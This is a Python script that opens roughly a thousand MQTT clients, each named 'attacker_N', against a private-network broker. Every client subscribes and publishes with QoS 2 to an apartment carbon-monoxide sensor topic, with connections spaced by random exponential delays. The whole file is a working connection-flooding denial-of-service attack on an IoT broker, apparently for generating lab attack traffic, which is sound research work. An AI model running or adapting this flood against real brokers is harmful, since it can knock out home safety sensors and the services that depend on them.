import time
import paho.mqtt.client as mqtt
import datetime
import numpy as np
import string
import random 
import json
from time import localtime, strftime, sleep

#parameters
broker =["172.20.10.2","test.mosquitto.org"]
clients=[]
messages=[]
number_clients= random.randint(1000,1024)

#create callbacks
def on_log(client, userdata, level,buf):
    print("log: "+buf)

def on_connect(client, userdata, flags, rc):
    if rc==0:
        print("connected ok")
    else:
        print("bad connection returned code: ", rc) 
def on_disconnect(client, userdata, flags, rc=0):
    print("disconnected result code "+str(rc))
def on_message(client, userdata, msg):
    my_decode=str(msg.payload.decode("utf-8","ignore"))
#clients
for i in range(number_clients):
    cname = "attacker_"+str(i)
    client = mqtt.Client(cname)
    #print(cname)
    clients.append(client)
random_time = random.randint(1,20)
event = 5000
times = 1
lambdas = ((event/times)/3600)
for client in clients:
    print("connecting to the broker", broker[0])
    client.connect(broker[0],keepalive=1)
    client.on_log = on_log
    client.on_disconnect = on_disconnect
    client.on_connect = on_connect
    client.on_message = on_message
    client.loop_start()
    client.subscribe("apartment/room_1/co/state",qos=2)
    client.publish("apartment/room_1/co/state", "payload", qos=2)
    time.sleep(np.random.exponential(1/lambdas))

client.on_disconnect
client.loop_stop()


